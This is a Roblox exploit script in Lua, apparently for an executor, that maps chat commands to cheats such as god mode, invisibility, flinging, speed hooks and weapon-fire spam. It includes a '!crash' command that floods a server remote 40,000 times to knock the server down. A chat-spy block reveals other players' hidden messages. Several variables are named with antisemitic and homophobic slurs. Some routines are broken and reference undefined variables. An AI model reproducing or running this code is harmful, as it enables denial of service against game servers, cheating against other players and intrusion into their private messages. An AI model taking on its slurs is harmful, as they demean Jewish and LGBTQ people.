	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
    end
end)


plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."antigh" or Cmd == Prefix.."ag" then

repeat wait() until game:IsLoaded() and game:WaitForChild"Players";

local Players, Uis, SGui = game:GetService"Players", game:GetService"UserInputService", game:GetService"StarterGui"; -- Services
local Client, AntiGH = Players.LocalPlayer, true;

function StateChangedEvent(T, Changed)
   if AntiGH == true then
       if Client and Client.Character and Client.Character:FindFirstChildOfClass"Humanoid" then
           if Changed == Enum.HumanoidStateType.FallingDown or Changed == Enum.HumanoidStateType.PlatformStanding then
               Client.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running);Client.Character.Humanoid.PlatformStand = false -- Credits to Aidez for this part
           end
       end
   end
end
Client.Character:WaitForChild"Humanoid".StateChanged:Connect(StateChangedEvent)

function CharacterAddedEvent()
   Client.Character:WaitForChild"Humanoid";
   Client.Character.Humanoid.StateChanged:Connect(StateChangedEvent)
end
Client.CharacterAdded:Connect(CharacterAddedEvent)
   end
end)


plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."antiaim" or Cmd == Prefix.."aa" then

local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
while wait() do
hrp.Velocity = Vector3.new(300,1,200)
wait(0.1)
hrp.Velocity = Vector3.new(-120,1,-300)
wait(0.1)
hrp.Velocity = Vector3.new(200,1,200)
wait(0.1)
hrp.Velocity = Vector3.new(-120,1,-200)
wait(0.1)
hrp.Velocity = Vector3.new(80,1,200)
wait(0.1)
hrp.Velocity = Vector3.new(-250,1,-200)
wait(0.1)
hrp.Velocity = Vector3.new(-300,1,100)
wait(0.1)
hrp.Velocity = Vector3.new(120,1,200)
wait(0.1)
hrp.Velocity = Vector3.new(-100,1,-300)
wait(0.1)
hrp.Velocity = Vector3.new(-120,1,200)
wait(0.1)
hrp.Velocity = Vector3.new(100,1,-140)
wait(0.1)
hrp.Velocity = Vector3.new(200,1,100)
wait(0.1)
end
end
end)


plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."antiafk" or Cmd == Prefix.."afk" then

local VirtualUser=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
VirtualUser:CaptureController()
VirtualUser:ClickButton2(Vector2.new())
end)
end
end)



local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."rejoin" or Cmd == Prefix.."rj" then
        game:GetService('TeleportService'):Teleport(game.PlaceId)
    end
end)

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."god" or Cmd == Prefix.."g" then

game:GetService('RunService').Stepped:connect(function()
	if god == true then
		game.Players.LocalPlayer.Character["Right Leg"]:Destroy()
	end
end)
game.Players.LocalPlayer.Character:BreakJoints()
		god = true
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."serverhop" or Cmd == Prefix.."sh" then
	local servers = {}
for _, server in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
   if type(server) == "table" and server.maxPlayers > server.playing and server.id ~= game.JobId then
        table.insert(servers, server.id)
    end
end
if #servers > 0 then
    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)])
else
    print("Devour: No Servers You Monkey")
end
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."anticrash" or Cmd == Prefix.."ac" then
game.Players.LocalPlayer.PlayerScripts.BubbleChat:Destroy()
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.. "shottyweld2" or Cmd == Prefix.."sw2" then

ShottyEquipted = true

local UserInputService = game:GetService('UserInputService')

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		print('Devour Is Cool XD')
	end
end)

game.Players.LocalPlayer.Character.ChildAdded:Connect(function(LGBTQ_Slayer)
	if LGBTQ_Slayer.Name == "Shotty" and LGBTQ_Slayer:IsA("Tool")  then
		ShottyEquipted = true 
	end
end)
game.Players.LocalPlayer.Character.ChildRemoved:Connect(function(JewishFag) 
	if JewishFag.Name == "Shotty" and JewishFag:IsA("Tool") then
		ShottyEquipted = false
	end
end)

if ShottyEquipted then
	for i,v in next, game.Players.LocalPlayer.Backpack:GetChildren() do
		if v:IsA'Tool' and v.Name == 'Shotty' then
			v.Parent = game.Players.LocalPlayer.Character
		end
	end
end

if ShottyEquipted then

	local Shot = game.Workspace.LocalPlayer.Shotty.Handle
	local rar = game.Players.LocalPlayer.Character["Right Arm"]
	local LocalPlayer = game.Players.LocalPlayer

	LocalPlayer.Character["Right Arm"]:FindFirstChild("RightGrip")
	LocalPlayer.Character["Right Arm"]:FindFirstChild("RightGrip"):Remove()
	rar.Touched:Connect(function(hit)
		if hit.Parent:FindFirstChild("Humanoid") then
			local Shotty = hit.Parent.Shotty
			RightArm.CFrame = Shotty.CFrame
			local weld = Instance.new("Weld")
			weld.RightArm = Shotty.CFrame
		end
	end)
	function InsertGrips()
		for i, v in pairs(grips) do
			grips(i).Parent = l.Character("Right Arm")
		end
	end


	s = Instance.new("Attachment",Shot)
	s.Rotation = Vector3.new(0, 0, 0)
	s.Position = Vector3.new(-1.5 ,0.4 ,0.6)

	r = Instance.new("Attachment",rar)
	r.Rotation = Vector3.new(0, 0, 0)
	r.Position = Vector3.new(-1.5 ,0.4 ,0.6)

	shp = Instance.new("AlignPosition",Shot)
	shp.ApplyAtCenterOfMass = false
	shp.MaxVelocity = 0/0
	shp.ReactionForceEnabled = false
	shp.Attachment0 = s
	shp.Attachment1 = r
	shp.RigidityEnabled = true;
	shp.MaxForce = 0/0;
	shp.RigidityEnabled = true;
	shp.Responsiveness = 10000;

	sho = Instance.new("AlignOrientation",Shot)
	sho.MaxAngularVelocity = 0/0
	sho.MaxTorque = 0/0
	sho.PrimaryAxisOnly = false
	sho.ReactionTorqueEnabled = false
	sho.Attachment0 = s
	sho.Attachment1 = r
	sho.RigidityEnabled = true

	local weld = Instance.new("WeldConstraint")
	weld.Parent = l.Character["Right Arm"]
	weld.Part0 = s
	weld.Part1 = rar

	s.Position =  Vector3.new(-1.5,0.4,0.6)
	
	sa = Instance.new("Attachment",Shot)
	sa.Rotation = Vector3.new(0, 0, 0)
	sa.Position = Vector3.new(-1.5 ,0.4 ,0.6)

	ra = Instance.new("Attachment",rar)
	ra.Rotation = Vector3.new(0, 0, 0)
	ra.Position = Vector3.new(-1.5 ,0.4 ,0.6)

	shap = Instance.new("AlignPosition",Shot)
	shap.ApplyAtCenterOfMass = false
	shap.MaxVelocity = 0/0
	shap.ReactionForceEnabled = false
	shap.Attachment0 = s
	shap.Attachment1 = r
	shap.RigidityEnabled = true;
	shap.MaxForce = 0/0;
	shap.RigidityEnabled = true;
	shap.Responsiveness = 10000;

	shao = Instance.new("AlignOrientation",Shot)
	shao.MaxAngularVelocity = 0/0
	shao.MaxTorque = 0/0
	shao.PrimaryAxisOnly = false
	shao.ReactionTorqueEnabled = false
	shao.Attachment0 = s
	shao.Attachment1 = r
	shao.RigidityEnabled = true

		local weld = Instance.new("WeldConstraint")
		weld.Parent = l.Character["Right Arm"]
		weld.Part0 = sa
		weld.Part1 = rar

		sa.Position =  Vector3.new(-1.5,0.4,0.6)

	sb = Instance.new("Attachment",Shot)
	sb.Rotation = Vector3.new(0, 0, 0)
	sb.Position = Vector3.new(-1.5 ,0.4 ,0.6)

	rb = Instance.new("Attachment",rar)
	rb.Rotation = Vector3.new(0, 0, 0)
	rb.Position = Vector3.new(-1.5 ,0.4 ,0.6)

	shbp = Instance.new("AlignPosition",Shot)
	shbp.ApplyAtCenterOfMass = false
	shbp.MaxVelocity = 0/0
	shbp.ReactionForceEnabled = false
	shbp.Attachment0 = s
	shbp.Attachment1 = r
	shbp.RigidityEnabled = true;
	shbp.MaxForce = 0/0;
	shbp.RigidityEnabled = true;
	shbp.Responsiveness = 10000;

	shbo = Instance.new("AlignOrientation",Shot)
	shbo.MaxAngularVelocity = 0/0
	shbo.MaxTorque = 0/0
	shbo.PrimaryAxisOnly = false
	shbo.ReactionTorqueEnabled = false
	shbo.Attachment0 = s
	shbo.Attachment1 = r
	shbo.RigidityEnabled = true

	local weld = Instance.new("WeldConstraint")
	weld.Parent = l.Character["Right Arm"]
	weld.Part0 = sb
	weld.Part1 = rar

	sb.Position =  Vector3.new(-1.5,0.4,0.6)

	sb = Instance.new("Attachment",Shot)
	sb.Rotation = Vector3.new(0, 0, 0)
	sb.Position = Vector3.new(-1.5 ,0.4 ,0.6)

	rb = Instance.new("Attachment",rar)
	rb.Rotation = Vector3.new(0, 0, 0)
	rb.Position = Vector3.new(-1.5 ,0.4 ,0.6)

	shcp = Instance.new("AlignPosition",Shot)
	shcp.ApplyAtCenterOfMass = false
	shcp.MaxVelocity = 0/0
	shcp.ReactionForceEnabled = false
	shcp.Attachment0 = s
	shcp.Attachment1 = r
	shcp.RigidityEnabled = true;
	shcp.MaxForce = 0/0;
	shcp.RigidityEnabled = true;
	shcp.Responsiveness = 10000;

	shco = Instance.new("AlignOrientation",Shot)
	shco.MaxAngularVelocity = 0/0
	shco.MaxTorque = 0/0
	shco.PrimaryAxisOnly = false
	shco.ReactionTorqueEnabled = false
	shco.Attachment0 = s
	shco.Attachment1 = r
	shco.RigidityEnabled = true

	local weld = Instance.new("WeldConstraint")
	weld.Parent = l.Character["Right Arm"]
	weld.Part0 = sc
	weld.Part1 = rar

	sc.Position =  Vector3.new(-1.5,0.4,0.6)

	sb = Instance.new("Attachment",Shot)
	sb.Rotation = Vector3.new(0, 0, 0)
	sb.Position = Vector3.new(-1.5 ,0.4 ,0.6)

	rb = Instance.new("Attachment",rar)
	rb.Rotation = Vector3.new(0, 0, 0)
	rb.Position = Vector3.new(-1.5 ,0.4 ,0.6)

	shdp = Instance.new("AlignPosition",Shot)
	shdp.ApplyAtCenterOfMass = false
	shdp.MaxVelocity = 0/0
	shdp.ReactionForceEnabled = false
	shdp.Attachment0 = s
	shdp.Attachment1 = r
	shdp.RigidityEnabled = true;
	shdp.MaxForce = 0/0;
	shdp.RigidityEnabled = true;
	shdp.Responsiveness = 10000;

	shdo = Instance.new("AlignOrientation",Shot)
	shdo.MaxAngularVelocity = 0/0
	shdo.MaxTorque = 0/0
	shdo.PrimaryAxisOnly = false
	shdo.ReactionTorqueEnabled = false
	shdo.Attachment0 = s
	shdo.Attachment1 = r
	shdo.RigidityEnabled = true

	local weld = Instance.new("WeldConstraint")
	weld.Parent = l.Character["Right Arm"]
	weld.Part0 = sd
	weld.Part1 = rar

	sd.Position =  Vector3.new(-1.5,0.4,0.6)



	for a,b in ipairs(guns) do
		b.GripPos = Vector3.new(-1.5,0.4,0.6)
	end
end
end
end)


local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."dis" or Cmd == Prefix.. "dc" then
local speak = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
speak:FireServer("Devour 1264","All")
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."crash" or Cmd == Prefix.."cr" then
local speak = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Plr = Players.LocalPlayer
wait(1)
speak:FireServer("Dogging On Prison With My New Crash","All")
wait(0.5)
speak:FireServer("I Know You Missed Me Devour 3500 Add Me","All")
wait(1)
speak:FireServer("Devour The Almighty Is Back","All")
wait(1)
pcall(function()
    Plr.PlayerScripts.BubbleChat.Disabled = true
end)
ReplicatedStorage.Xbox:FireServer()
wait(1)
for i = 1, 40000 do
    ReplicatedStorage.Talk:FireServer("DEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOURDEVOUR") 
end
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."bypass" or Cmd == Prefix.."bp" then

local me = game.Players.LocalPlayer
		local mename = game.Players.LocalPlayer.Name

		local Humanoid = Instance.new("Model" ,game.Workspace)
		Humanoid.Name = ""..mename..""
		me.Character:Destroy()
		wait(1.5)

		me.Character = Humanoid
	end
end)


local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."unbypass" or Cmd == Prefix.."unbp" then
for _,v in pairs(game.workspace:GetChildren()) do
			if v.Name == ""..mename.."" then
				game.workspace[mename].Parent = me
				me.Character:Destroy()
			end
		end
	end
end)



local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."shottyw" or Cmd == Prefix.."sw" then
ShottyEquipted = true

local UserInputService = game:GetService('UserInputService')

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        print('Devour Is Cool XD')
    end
end)

game.Players.LocalPlayer.Character.ChildAdded:Connect(function(LGBTQ_Slayer)
    if LGBTQ_Slayer.Name == "Shotty" and LGBTQ_Slayer:IsA("Tool")  then
        ShottyEquipted = true 
    end
end)
game.Players.LocalPlayer.Character.ChildRemoved:Connect(function(JewishFag) 
    if JewishFag.Name == "Shotty" and JewishFag:IsA("Tool") then
        ShottyEquipted = false
    end
end)

if ShottyEquipted then
    for i,v in next, game.Players.LocalPlayer.Backpack:GetChildren() do
        if v:IsA'Tool' and v.Name == 'Shotty' then
            v.Parent = game.Players.LocalPlayer.Character
        end
    end
end

if ShottyEquipted then

local Shot = game.Players.LocalPlayer.Backpack.Shotty.Handle
local rar = game.Players.LocalPlayer.Character["Right Arm"]

s = Instance.new("Attachment",Shot)
s.Rotation = Vector3.new(0, 0, 0)
s.Position = Vector3.new(-1.5 ,0.4 ,0.6)

r = Instance.new("Attachment",rar)
r.Rotation = Vector3.new(0, 0, 0)
r.Position = Vector3.new(-1.5 ,0.4 ,0.6)

shp = Instance.new("AlignPosition",Shot)
shp.ApplyAtCenterOfMass = false
shp.MaxVelocity = 0/0
shp.ReactionForceEnabled = false
shp.Attachment0 = s
shp.Attachment1 = r
shp.RigidityEnabled = true;
shp.MaxForce = 0/0;
shp.RigidityEnabled = true;
shp.Responsiveness = 10000;

sho = Instance.new("AlignOrientation",Shot)
sho.MaxAngularVelocity = 0/0
sho.MaxTorque = 0/0
sho.PrimaryAxisOnly = false
sho.ReactionTorqueEnabled = false
sho.Attachment0 = s
sho.Attachment1 = r
sho.RigidityEnabled = true
end
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."speedpunch" or Cmd == Prefix.."sp" then
game.Players.LocalPlayer.Backpack.Punch.Info.AnimSpeed.Value = 60
game.Players.LocalPlayer.Backpack.Punch.Info.Cooldown.Value = 0.001
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."unspeedpunch" or Cmd == Prefix.."unsp" then
game.Players.LocalPlayer.Backpack.Punch.Info.AnimSpeed.Value = 1
game.Players.LocalPlayer.Backpack.Punch.Info.Cooldown.Value = 0.48
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."noseat" or Cmd == Prefix.."nos" then
NeverSitting = true
if NeverSitting then 
       local workspaceChildren = workspace:GetDescendants()
		for i = 1,#workspaceChildren do 
			local Child = workspaceChildren[i]
			if string.find(Child.ClassName:lower(),"seat") then
				Child.Parent = CoreGui
			end
		end
	else
		local CoreGuiDescendants = CoreGui:GetDescendants() 
		for i = 1,#CoreGuiDescendants do 
			local Child = CoreGuiDescendants[i]
			if string.find(Child.ClassName:lower(),"seat") then 
				Child.Parent = workspace
			end
		end
	end
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."antife" or Cmd == Prefix.."af" then

local client = game:GetService("Players").LocalPlayer;
local lighting = game:GetService("Lighting");

client.Character:FindFirstChild("HumanoidRootPart"):Destroy();
client.Character:FindFirstChildWhichIsA("Humanoid").Parent = lighting;
lighting:FindFirstChildWhichIsA("Humanoid").Parent = client.Character;
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."fakelag" or Cmd == Prefix.."flag" then
local hrp = game.Workspace.CRYOVERlT.HumanoidRootPart
while wait (1) do
hrp.Anchored = true
wait(1)
hrp.Anchored = false
end
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."unfakelag" or Cmd == Prefix.."unflag" then
local hrp = game.Workspace.CRYOVERlT.HumanoidRootPart
while wait (1) do
hrp.Anchored = false
end
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."invis" or Cmd == Prefix.."iv" then

local Character = game:GetService("Players").LocalPlayer.Character
		local newchar = Instance.new("Model", workspace)
		local Head  = Instance.new("Part", newchar)
		Head.Name = "Head"
		local Torso =  Instance.new("Part", newchar)
		Torso.Name = "Torso"
		local Humanoid = Instance.new("Humanoid", newchar)
		Humanoid.Name = "Humanoid"
		local KO = Instance.new ("BoolValue", newchar)
		KO.Name = "KO"

		Character.HumanoidRootPart.RootAttachment:Destroy()
		Character.HumanoidRootPart.RootJoint:Destroy()
		Character.Torso.Anchored = true
		Character.Head.CanCollide = false
		Character.Torso.CanCollide = false
		Character["Left Leg"].CanCollide = false
		Character["Right Leg"].CanCollide = false
		Character["Left Arm"].CanCollide = false
		Character["Right Arm"].CanCollide = false
		wait(3)
		game.Players.LocalPlayer.Character = newchar
		game.Players.LocalPlayer.Backpack.Glock.Parent = newchar
		game.Players.LocalPlayer.Backpack.Shotty.Parent = newchar
		
		wait(15)
		workspace.CurrentCamera.CameraSubject = newchar
	end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."spamequips" or Cmd == Prefix.."ses" then
        getgenv().SpamEquip = true
	local Player = game:GetService("Players").LocalPlayer

	while SpamEquip do
		wait()
		for i,v in pairs(Player.Backpack:GetChildren()) do
			if v.Name == "Shotty" then
				v.Parent = Player.Character
				wait()
				for i,v in pairs(Player.Character:GetChildren()) do
					if v.Name == "Shotty" then
						v.Parent = Player.Backpack
					end
				end   
			end
		end
	end
    end
end)


local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."unspamequip" or Cmd == Prefix.."unse" then
        	getgenv().SpamEquip = false
	local Player = game:GetService("Players").LocalPlayer

	while SpamEquip do
		wait()
		for i,v in pairs(Player.Backpack:GetChildren()) do
			if v.Name == "Shotty" then
				v.Parent = Player.Character
				wait()
				for i,v in pairs(Player.Character:GetChildren()) do
					if v.Name == "Shotty" then
						v.Parent = Player.Backpack
					end
				end   
			end
		end
	end
    end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."spamequipg" or Cmd == Prefix.."seg" then
        getgenv().SpamEquip = true
	local Player = game:GetService("Players").LocalPlayer

	while SpamEquip do
		wait()
		for i,v in pairs(Player.Backpack:GetChildren()) do
			if v.Name == "Glock" then
				v.Parent = Player.Character
				wait()
				for i,v in pairs(Player.Character:GetChildren()) do
					if v.Name == "Glock" then
						v.Parent = Player.Backpack
					end
				end   
			end
		end
	end
    end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."close" or Cmd == Prefix.."open" then

local WorkspaceChildren = workspace:GetChildren()
	for i = 1,#WorkspaceChildren do
		local Child = WorkspaceChildren[i]
		if Child.Name == "Door" and Child:FindFirstChild'Click' and Child:FindFirstChild'Lock' then 
			Child.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			Child.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
		end
	end
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."reset" or Cmd == Prefix.."re" then
        game.Players.LocalPlayer.Character:FindFirstChild("Head"):Destroy()
    end
end)


        local stationaryrespawn = false
local needsrespawning = false
local haspos = false
local pos = CFrame.new()

local Respawning = Instance.new("ScreenGui")
local RespawningButton = Instance.new("TextButton")

Respawning.Name = "Respawning"
Respawning.Parent = game.CoreGui


function StatRespawn(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.T and gameProcessedEvent == false then        
stationaryrespawn = not stationaryrespawn
    end
end






game:GetService("UserInputService").InputBegan:connect(StatRespawn)

game:GetService('RunService').Stepped:connect(function()


if stationaryrespawn == true and game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
if haspos == false then
pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
haspos = true
end

needsrespawning = true
end


if needsrespawning == true then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end


if stationaryrespawn == true then 
RespawningButton.Text = "Returning"
else
RespawningButton.Text = "Not Returning"
end


end)

game.Players.LocalPlayer.CharacterAdded:connect(function()
wait(0.6)
needsrespawning = false
haspos = false
end)


function onKeyPress(actionName, userInputState, inputObject)
   if userInputState == Enum.UserInputState.Begin then
       game.Players.LocalPlayer.Character:BreakJoints()
   end
end

game.ContextActionService:BindAction("keyPress", onKeyPress, false, Enum.KeyCode.R)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."glockspam" or Cmd == Prefix.."gs" then
_G.conn = game:GetService("RunService").Stepped:Connect(function()
    game.workspace.CRYOVERlT.Glock.Click:FireServer()
    end)
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.. "shottyspam" or Cmd == Prefix.. "ss" then
_G.conn = game:GetService("RunService").Stepped:Connect(function()
    game.workspace.CRYOVERlT.Shotty.Click:FireServer()
    end)
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."noslow" or Cmd == Prefix.."ns" then
local mt = getrawmetatable(game)
local backup
backup = hookfunction(mt.__newindex, newcclosure(function(self, key, value)
if key == "WalkSpeed" and value < 16 then
value = 16
end
return backup(self, key, value)
end))
end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."weld6" or Cmd == Prefix.."w6" then
        local char = game.Players.LocalPlayer.Character
local torso = char.Torso

torso_att = Instance.new("Attachment", torso)

torso_att.Rotation = Vector3.new(0,0,0)
torso_att.Position = Vector3.new(0,0,0)

rarm = char["Right Arm"]
torso["Right Shoulder"]:Destroy()
rarm.RightShoulderAttachment:Destroy()

r = Instance.new("Attachment",rarm)
r.Rotation = Vector3.new(-50,-55,0)
r.Position = Vector3.new(-1.2,-0.2,-0.29)

t = Instance.new("Attachment",torso)

rap = Instance.new("AlignPosition",rarm)
rap.ApplyAtCenterOfMass = false
rap.MaxVelocity = 0/0
rap.ReactionForceEnabled = false
rap.Attachment0 = r
rap.Attachment1 = t
rap.RigidityEnabled = true;
rap.MaxForce = 0/0;
rap.RigidityEnabled = true;
rap.Responsiveness = 10000;
rarm.CanCollide = false

rao = Instance.new("AlignOrientation",rarm)
rao.MaxAngularVelocity = 0/0
rao.MaxTorque = 0/0
rao.PrimaryAxisOnly = false
rao.ReactionTorqueEnabled = false
rao.Attachment0 = r
rao.Attachment1 = t
rao.RigidityEnabled = true

game:GetService("RunService").Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(100,100,100)
end)

wait(2)
print(rarm.Velocity)
for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v.Name == "Right Arm" then 
game:GetService("RunService").RenderStepped:connect(function()
v.Velocity = Vector3.new(1e1,2e2,3e3)
end)
end
end
    end
end)


--This script reveals ALL hidden messages in the default chat
--chat "/spy" to toggle!
enabled = true
--if true will check your messages too
spyOnMyself = true
--if true will chat the logs publicly (fun, risky)
public = false
--if true will use /me to stand out
publicItalics = true
--customize private logs
privateProperties = {
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
--////////////////////////////////////////////////////////////////
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance
 
local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
